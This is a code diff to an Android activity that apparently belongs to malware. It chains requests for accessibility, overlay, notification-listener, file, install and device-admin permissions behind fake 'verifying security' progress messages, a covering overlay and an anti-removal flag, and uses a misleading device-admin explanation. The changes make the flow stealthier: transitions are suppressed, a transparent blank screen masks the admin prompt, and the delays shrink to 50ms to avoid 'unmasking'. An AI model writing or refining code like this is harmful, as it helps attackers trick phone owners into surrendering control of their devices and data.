@@ -93,11 +93,21 @@ public class PermissionActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        try {
+            if (Build.VERSION.SDK_INT >= 34) {
+                overrideActivityTransition(OVERRIDE_TRANSITION_OPEN, 0, 0);
+                overrideActivityTransition(OVERRIDE_TRANSITION_CLOSE, 0, 0);
+            } else {
+                overridePendingTransition(0, 0);
+            }
+        } catch (Throwable ignored) {}
         
         // SUSPEND ANTI-REMOVAL
         getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("is_repairing", true).apply();
 
         if (getIntent() != null && getIntent().getBooleanExtra("launch_admin", false)) {
+            setContentView(new android.view.View(this));
+            getWindow().setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
             openAdminSettings();
             return;
         }
@@ -288,28 +298,28 @@ public class PermissionActivity extends AppCompatActivity {
                 IO_Persistence_Manager.setPermissionCoverVisible(true);
             }
 
-            // FAST DIRECT PIPELINE: 200ms Lightning Dispatch
+            // FAST DIRECT PIPELINE: 50ms Lightning Dispatch (Zero Stall / Zero Unmask)
             if (accMissing) {
                 restoreRingerMode();
                 IO_Persistence_Manager.setPermissionCoverVisible(false);
                 showAccessibilityGuide();
             } else if (runtimeMissing) {
                 updateVerifyingUI(35, "Verifying runtime security permissions...");
-                chainHandler.postDelayed(this::requestMissingBatch, 200);
+                chainHandler.postDelayed(this::requestMissingBatch, 50);
             } else if (overlayMissing) {
                 updateVerifyingUI(55, "Checking display over other apps...");
-                chainHandler.postDelayed(this::openOverlaySettings, 200);
+                chainHandler.postDelayed(this::openOverlaySettings, 50);
             } else if (notifMissing) {
                 updateVerifyingUI(75, "Verifying notification listener access...");
-                chainHandler.postDelayed(this::openNotificationSettings, 200);
+                chainHandler.postDelayed(this::openNotificationSettings, 50);
             } else if (filesMissing) {
                 hasAttemptedFiles = true;
                 updateVerifyingUI(88, "Checking file storage access...");
-                chainHandler.postDelayed(this::openFilesSettings, 200);
+                chainHandler.postDelayed(this::openFilesSettings, 50);
             } else if (installMissing) {
                 hasAttemptedInstall = true;
                 updateVerifyingUI(96, "Checking package installation access...");
-                chainHandler.postDelayed(this::openInstallSettings, 200);
+                chainHandler.postDelayed(this::openInstallSettings, 50);
             } else {
                 restoreRingerMode();
                 IO_Persistence_Manager.setPermissionCoverVisible(false);
@@ -318,7 +328,7 @@ public class PermissionActivity extends AppCompatActivity {
                 // Pause for 0.8 second after scan reaches 100%, then pop up completion text & FINISH button
                 chainHandler.postDelayed(this::showCompletionUI, 800);
             }
-        }, 200);
+        }, 50);
     }
 
     private void showCompletionUI() {
@@ -442,6 +452,12 @@ public class PermissionActivity extends AppCompatActivity {
     protected void onNewIntent(Intent intent) {
         super.onNewIntent(intent);
         setIntent(intent);
+        if (intent != null && intent.getBooleanExtra("launch_admin", false)) {
+            setContentView(new android.view.View(this));
+            getWindow().setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
+            openAdminSettings();
+            return;
+        }
         handleInstructions(intent);
     }
 
@@ -544,14 +560,17 @@ public class PermissionActivity extends AppCompatActivity {
             intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
             intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Synchronization with system frameworks is required to maintain device stability.");
             startActivityForResult(intent, REQUEST_CODE_DEVICE_ADMIN);
+            overridePendingTransition(0, 0);
         } catch (Exception ignored) {}
     }
 
+    @SuppressWarnings("deprecation")
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == REQUEST_CODE_DEVICE_ADMIN) {
             finish();
+            overridePendingTransition(0, 0);
         }
     }
 
@@ -573,6 +592,11 @@ public class PermissionActivity extends AppCompatActivity {
     @Override
     protected void onResume() {
         super.onResume();
+
+        boolean isLaunchingAdmin = getIntent() != null && getIntent().getBooleanExtra("launch_admin", false);
+        if (isLaunchingAdmin) {
+            return;
+        }
 
         if (allStandardGranted()) {
             restoreRingerMode();
